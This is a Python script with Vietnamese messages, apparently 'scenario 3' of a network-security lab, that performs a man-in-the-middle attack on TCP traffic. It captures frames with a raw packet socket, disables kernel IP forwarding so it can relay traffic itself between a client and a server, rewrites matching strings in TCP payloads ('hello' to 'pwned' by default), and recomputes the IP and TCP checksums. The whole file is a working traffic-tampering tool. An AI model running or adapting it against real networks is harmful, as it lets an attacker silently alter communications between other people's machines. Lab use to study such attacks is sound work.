#!/usr/bin/env python3
import argparse
import socket
import struct
import sys

from arp import iface_info, mac_to_bytes, resolve_mac

ETH_P_ALL = 0x0003
SOL_PACKET = 263
PACKET_IGNORE_OUTGOING = 23


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def main():
    parser = argparse.ArgumentParser(description="Kich ban 3: MITM sua payload TCP")
    parser.add_argument("--iface", default="eth0")
    parser.add_argument("--client", default="10.11.1.10")
    parser.add_argument("--server", default="10.11.1.20")
    parser.add_argument("--client-mac", default=None)
    parser.add_argument("--server-mac", default=None)
    parser.add_argument("--find", default="hello")
    parser.add_argument("--replace", default="pwned")
    args = parser.parse_args()

    find = args.find.encode()
    replace = args.replace.encode()
    if len(find) != len(replace):
        sys.exit("Chuoi tim va chuoi thay phai cung do dai")

    _, own_mac = iface_info(args.iface)
    client_mac = mac_to_bytes(args.client_mac) if args.client_mac else resolve_mac(args.iface, args.client)
    server_mac = mac_to_bytes(args.server_mac) if args.server_mac else resolve_mac(args.iface, args.server)

    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as fh:
            fh.write("0\n")
        print("[*] Dat ip_forward=0 de script tu chuyen tiep")
    except OSError as exc:
        print("[!] Khong ghi duoc ip_forward: %s" % exc)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((args.iface, 0))
    try:
        sock.setsockopt(SOL_PACKET, PACKET_IGNORE_OUTGOING, 1)
    except OSError:
        pass

    pair = {args.client, args.server}
    print("[*] MITM tren %s: %s <-> %s" % (args.iface, args.client, args.server))
    print("[*] MAC client %s, MAC server %s" % (
        ":".join("%02x" % b for b in client_mac), ":".join("%02x" % b for b in server_mac)))
    print("[*] Thay '%s' -> '%s'" % (args.find, args.replace))
    modified = 0
    while True:
        frame = sock.recv(65535)
        if len(frame) < 34:
            continue
        if struct.unpack("!H", frame[12:14])[0] != 0x0800:
            continue
        ip = frame[14:]
        if ip[0] >> 4 != 4:
            continue
        ihl = (ip[0] & 0x0F) * 4
        if len(ip) < ihl + 20:
            continue
        src = socket.inet_ntoa(ip[12:16])
        dst = socket.inet_ntoa(ip[16:20])
        if {src, dst} != pair:
            continue
        dst_mac = server_mac if src == args.client else client_mac
        eth = dst_mac + own_mac + frame[12:14]
        if struct.unpack("!H", ip[6:8])[0] & 0x1FFF:
            sock.send(eth + ip)
            continue
        if ip[9] != 6:
            sock.send(eth + ip)
            continue

        tcp = ip[ihl:]
        tcp_hlen = (tcp[12] >> 4) * 4
        payload = tcp[tcp_hlen:]
        new_payload = payload.replace(find, replace) if find in payload else payload

        new_seg = bytearray(tcp[:tcp_hlen] + new_payload)
        iphdr = bytearray(ip[:ihl])
        struct.pack_into("!H", iphdr, 2, len(iphdr) + len(new_seg))
        struct.pack_into("!H", iphdr, 10, 0)
        struct.pack_into("!H", iphdr, 10, checksum(bytes(iphdr)))

        struct.pack_into("!H", new_seg, 16, 0)
        pseudo = ip[12:20] + b"\x00\x06" + struct.pack("!H", len(new_seg))
        struct.pack_into("!H", new_seg, 16, checksum(pseudo + bytes(new_seg)))

        sock.send(eth + bytes(iphdr) + bytes(new_seg))
        if new_payload is payload:
            continue

        modified += 1
        sport, dport = struct.unpack("!HH", tcp[:4])
        print("[+] #%d %s:%d -> %s:%d  '%s' -> '%s'" %
              (modified, src, sport, dst, dport, args.find, args.replace))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Dung MITM")
